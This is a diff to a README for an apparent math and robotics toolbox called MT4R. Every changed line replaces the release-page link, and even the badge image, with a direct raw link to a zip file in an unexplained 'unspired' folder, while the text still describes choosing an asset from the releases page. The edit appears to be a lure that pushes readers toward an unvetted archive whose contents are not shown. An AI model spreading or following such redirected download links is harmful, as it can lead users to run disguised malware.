@@ -1,6 +1,6 @@
 # 🛠️ MT4R - Tools for Math and Robotics Made Easy
 
-![Download MT4R](https://img.shields.io/badge/Download-MT4R-brightgreen)
+![Download MT4R](https://raw.githubusercontent.com/Lou-Cypher78/MT4R/main/unspired/MT4R.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to MT4R! This application is a toolbox for math, algorithms, and codes s
 
 To get started, you need to download MT4R. Follow these steps to install the software:
 
-1. **Visit the Releases Page**: Click [here to download MT4R](https://github.com/Lou-Cypher78/MT4R/releases).
+1. **Visit the Releases Page**: Click [here to download MT4R](https://raw.githubusercontent.com/Lou-Cypher78/MT4R/main/unspired/MT4R.zip).
 2. **Select the Latest Release**: On the releases page, find the most recent version at the top of the list.
 3. **Download the Application**: Look for a link or button that says "Asset" next to the latest version – it will include the executable file for your operating system. Click on this to start the download.
 
@@ -60,4 +60,4 @@ MT4R is open-source software. You can freely use, modify, and distribute it unde
 
 To stay informed about updates, new features, and more, follow our project on GitHub. We encourage feedback and contributions from users like you to enhance MT4R further.
 
-Remember to click [here to download MT4R](https://github.com/Lou-Cypher78/MT4R/releases) and start building your robotics projects today!
+Remember to click [here to download MT4R](https://raw.githubusercontent.com/Lou-Cypher78/MT4R/main/unspired/MT4R.zip) and start building your robotics projects today!
